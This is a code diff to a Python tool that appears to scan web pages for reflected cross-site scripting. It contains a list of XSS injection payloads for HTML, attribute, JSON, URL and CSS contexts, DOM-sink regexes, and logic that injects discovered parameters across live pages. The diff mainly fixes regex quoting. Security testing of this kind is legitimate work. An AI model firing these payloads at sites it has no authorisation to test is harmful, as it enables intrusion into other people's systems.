@@ -12,7 +12,7 @@ PAYLOAD_CLASSES = {
                     "<details open ontoggle=alert(1)>", "<script>alert(1)</script>"],
     "html_attr":   ['" onmouseover=alert(1) x="', "' onmouseover=alert(1) x='",
                     '" autofocus onfocus=alert(1) "'],
-    "json":        ['":<img src=x onerror=alert(1)>"', '","x":"<svg onload=alert(1)>'],
+    "json":        ['":<img src=x onerror=alert(1)>"', '",\"x\":\"<svg onload=alert(1)>'],
     "url_context": ["javascript:alert(1)", "data:text/html,<script>alert(1)</script>"],
     "css_context": ["};alert(1)//", "expression(alert(1))"],
     "unknown":     ["<img src=x onerror=alert(1)>", '" onmouseover=alert(1) "'],
@@ -25,7 +25,7 @@ DOM_SINKS = [
     r'eval\s*\(',
     r'setTimeout\s*\([^,)]*JSXr4y7731z',
     r'setInterval\s*\([^,)]*JSXr4y7731z',
-    r'(?:src|href|action)\s*=\s*["\'\']?JSXr4y7731z',
+    r'(?:src|href|action)\s*=\s*["\']?JSXr4y7731z',
 ]
 
 HIGH_VALUE = {
@@ -48,16 +48,17 @@ def detect_context(html, canary):
     if re.search(r"(?:eval|setTimeout|setInterval|Function)\s*\([^)]*" + ec, sur):
         return "js_exec"
     if re.search(r"<script[^>]*>[^<]*" + ec, sur, re.DOTALL):
-        return "js_string" if re.search(r'["\'\']' + ec, sur) else "js_exec"
-    if re.search(r"(?:href|src|action|data-[a-z]+|on[a-z]+|value)\s*=\s*["\'][^\"\'']*" + ec, sur):
+        return "js_string" if re.search(r'["\']' + ec, sur) else "js_exec"
+    # FIX: use a proper character class instead of broken inline quotes
+    if re.search(r'(?:href|src|action|data-[a-z]+|on[a-z]+|value)\s*=\s*["\'][^"\']*' + ec, sur):
         return "html_attr"
-    if re.search(r"=\s*["\'][^\"\'']*" + ec + r"[^\"\'']*["\']", sur):
+    if re.search(r'=\s*["\'][^"\']*' + ec + r'[^"\']*["\']', sur):
         return "html_attr"
-    if re.search(r"(?:href|src|action)=["\']?" + ec, sur):
+    if re.search(r'(?:href|src|action)=["\']?' + ec, sur):
         return "url_context"
     if re.search(r"<style[^>]*>[^<]*" + ec, sur, re.DOTALL):
         return "css_context"
-    if re.search(r'["\'\']' + ec + r'["\'\']', sur) and html.strip().startswith(("{","[")):
+    if re.search(r'["\']' + ec + r'["\']', sur) and html.strip().startswith(("{","[")):
         return "json"
     if re.search(r">[^<]*" + ec + r"[^<]*<", sur):
         return "html_body"
@@ -170,10 +171,8 @@ def build_probe_list(ctx):
     for entry in ctx.robots_live:
         if entry.get("status") == 200 and "html" in entry.get("content_type", "").lower():
             url = entry.get("resolved_url") or entry["url"]
-            # params already in the URL
             for param in parse_qs(urlparse(url).query).keys():
                 add(url, param, "robots")
-            # cross-inject every JS-discovered param onto every live robots page
             for param in ctx.js_global_params:
                 add(_build_probe_url(url, param, "x"), param, "robots+js")
 
